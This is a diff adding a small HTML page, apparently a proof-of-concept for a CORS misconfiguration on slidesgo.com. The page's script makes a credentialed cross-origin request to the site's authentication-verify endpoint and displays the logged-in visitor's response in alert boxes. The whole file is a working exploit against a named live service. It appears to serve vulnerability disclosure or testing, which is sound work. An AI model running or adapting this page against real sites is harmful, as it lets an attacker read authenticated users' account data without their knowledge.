@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MasterCode Cors</title>
+</head>
+<body>
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        alert(xhttp.responseText);
+    }
+
+    alert(xhttp.responseText);
+};
+
+xhttp.open("GET", "https://slidesgo.com/editor/api/auth/verify?lang=en&cacheBuster=1", true);
+xhttp.withCredentials = true; // Corrected line
+xhttp.send();
+</script>
+</body>
+</html>
